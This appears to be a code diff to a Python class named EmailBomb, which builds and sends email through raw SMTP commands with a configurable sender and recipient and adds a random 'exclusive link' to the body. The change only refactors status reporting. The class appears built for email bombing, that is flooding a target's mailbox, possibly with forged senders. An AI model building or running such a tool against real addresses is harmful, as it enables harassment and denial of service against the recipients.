@@ -7,7 +7,7 @@ import time
 
 class EmailBomb:
     def __init__(self, id, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
-        self.notify_header = id,
+        self.notify_header = str(id)
         self.to_addr = to_addr
         self.from_addr = from_addr
         self.port = port
@@ -50,56 +50,56 @@ class EmailBomb:
                 if code:
                     break
 
-        self.notify = "send mail from"
+        self.update_notify("send mail from")
         while self.exit_flag:
             # 表明发件地址
             code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
             if not code:
                 continue
 
-            self.notify = "send rcpt to"
+            self.update_notify("send rcpt to")
             # 表明收件地址
             code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
             if code:
                 break
 
-            self.notify = msg
+            self.update_notify(msg)
 
-        self.notify = "send data"
+        self.update_notify("send data")
         while self.exit_flag:
             # 信件具体内容
             code, msg = self.emailer.Send(u"data")
             if code:
                 break
 
-            self.notify = msg
+            self.update_notify(msg)
 
-        self.notify = "send to"
+        self.update_notify("send to")
         while self.exit_flag:
             # to:
             code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
             if not code:
-                self.notify = msg
+                self.update_notify(msg)
                 continue
 
             # from:
-            self.notify = "send from"
+            self.update_notify("send from")
             code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
             if not code:
-                self.notify = msg
+                self.update_notify(msg)
                 continue
 
             # subject:
-            self.notify = "send subject"
+            self.update_notify("send subject")
             code, msg = self.emailer.Send("subject: "+subject, recv=False)
             if not code:
-                self.notify = msg
+                self.update_notify(msg)
                 continue
 
             break  # 上面都发送成功
 
         # body:
-        self.notify = "send body"
+        self.update_notify("send body")
         code, msg = self.emailer.Send(
             content+u"\r\n\r\n你的专属链接为："+"".join(
                 random.choice(string.hexdigits)
@@ -109,5 +109,5 @@ class EmailBomb:
             check="250"  # 状态码为 250 说明发送成功
         )
 
-        self.notify = msg
+        self.update_notify(msg)
         time.sleep(1)
